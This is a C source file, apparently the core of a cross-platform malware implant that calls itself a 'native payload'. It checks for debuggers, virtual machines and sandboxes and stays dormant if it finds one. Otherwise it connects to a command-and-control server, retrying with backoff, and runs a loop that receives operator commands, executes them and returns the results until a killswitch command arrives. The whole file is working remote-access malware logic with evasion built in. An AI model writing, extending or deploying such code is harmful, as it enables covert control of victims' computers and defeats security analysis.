// Main entry point for native payload
// Platform-independent core implementation

#include "config.h"
#include "utils.h"
#include "commands.h"
#include "protocol.h"

// Forward declarations
int main_payload(void);

// Platform-specific entry points
#ifdef PLATFORM_WINDOWS

// Windows entry point without CRT
int WINAPI WinMainCRTStartup(void) {
    // Initialize without CRT
    return main_payload();
}

#elif defined(PLATFORM_LINUX) || defined(PLATFORM_MACOS)

// Standard main for Unix-like systems
int main(void) {
    return main_payload();
}

#endif

// Main payload logic
int main_payload(void) {
    // Initialize random seed
    uint32_t seed = get_tick_count() ^ get_process_id();
    set_random_seed(seed);
    
    // Anti-analysis checks
    if (detect_debugger() || detect_vm() || detect_sandbox()) {
        // If detected, act normally but don't connect
        return 0;
    }
    
    // Initialize networking
    if (socket_init() != ERR_SUCCESS) {
        return 1;
    }
    
    // Connection config
    const char* c2_host = SERVER_HOST;
    uint16_t c2_port = SERVER_PORT;
    
    // Main communication loop
    int retry_count = 0;
    int max_retries = 10;
    
    while (retry_count < max_retries) {
        // Try to connect
        int sock = socket_create();
        if (sock < 0) {
            sleep_ms(5000);
            retry_count++;
            continue;
        }
        
        // Set timeout
        socket_set_timeout(sock, 30000);
        
        // Connect to C2
        if (socket_connect(sock, c2_host, c2_port) != ERR_SUCCESS) {
            socket_close(sock);
            sleep_ms(10000 * (retry_count + 1)); // Exponential backoff
            retry_count++;
            continue;
        }
        
        // Handshake
        if (protocol_handshake_simple(sock) != ERR_SUCCESS) {
            socket_close(sock);
            sleep_ms(5000);
            retry_count++;
            continue;
        }
        
        // Command loop
        retry_count = 0; // Reset on successful connection
        
        while (1) {
            // Receive command
            uint8_t cmd_buffer[4096];
            size_t cmd_len = sizeof(cmd_buffer);
            
            int result = protocol_receive(sock, cmd_buffer, &cmd_len);
            if (result != ERR_SUCCESS) {
                // Connection lost
                break;
            }
            
            // Parse and execute command
            if (cmd_len >= sizeof(command_packet_t)) {
                command_packet_t* cmd = (command_packet_t*)cmd_buffer;
                
                // Verify magic
                if (cmd->magic != PROTOCOL_MAGIC) {
                    continue;
                }
                
                // Prepare response buffer
                uint8_t response[8192];
                size_t response_len = sizeof(response);
                
                // Execute command
                result = execute_command(cmd->cmd_id, 
                                        cmd->data, 
                                        cmd->data_len, 
                                        response, 
                                        &response_len);
                
                // Send response
                protocol_send(sock, response, response_len);
                
                // Check for killswitch
                if (cmd->cmd_id == CMD_KILLSWITCH) {
                    socket_close(sock);
                    socket_cleanup();
                    return 0;
                }
            }
        }
        
        // Close connection and retry
        socket_close(sock);
        sleep_ms(5000);
    }
    
    // Cleanup
    socket_cleanup();
    return 0;
}